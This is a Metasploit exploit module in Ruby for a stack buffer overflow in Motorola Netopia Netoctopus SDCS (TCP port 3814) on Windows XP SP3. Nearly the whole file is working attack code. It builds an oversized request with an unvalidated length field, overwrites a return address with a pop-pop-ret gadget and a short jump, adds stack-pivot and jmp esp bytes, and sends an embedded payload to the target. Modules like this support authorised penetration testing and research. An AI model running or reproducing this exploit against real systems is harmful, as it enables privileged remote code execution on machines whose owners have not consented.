require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Motorola Netopia Netoctopus SDCS Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a vulnerability within the code responsible for
				parsing client requests. When reading in a request from the network,
				a 32-bit integer is read in that specifies the number of bytes that
				follow. This value is not validated, and is then used to read data into
				a fixed-size stack buffer.
			},
			'Author'         => [ 'James Fitts' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=851' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'	=> 500,
					'DisableNops' => 'true',
					'BadChars' => "",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 
						'Windows XP SP3 EN', 
							{ 
								# pop ecx/ pop ecx/ retn
								# msvcrt.dll
								'Ret' => 0x0044e046, 
							} 
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 14 2008'))

		register_options(
			[
				Opt::RPORT(3814)
			], self.class )
	end

	def exploit
		connect

		p = payload.encoded

		pkt = "\x41" * 600
		pkt[0, 4] = [0x01000000].pack('V')
		pkt[8, 4] = [0x01000000].pack('V')
		pkt[12, 4] = [0x01000000].pack('V')
		pkt[16, 4] = [0x03000000].pack('V')		# this is the value mentioned above
		pkt[20, 4] = [0x66000000].pack('V')
		pkt[30, p.length] = p
		pkt[545, 4] = "\xeb\x06\x90\x90"
		pkt[549, 4] = [target.ret].pack('V')
		pkt[558, 6] = "\x81\xc4\x34\x06\x00\x00"	# add esp, 1588
		pkt[564, 2] = "\xff\xe4"			# jmp esp


		print_status("Trying target %s..." % target.name)

		sock.put(pkt)

		handler
		disconnect
	end

end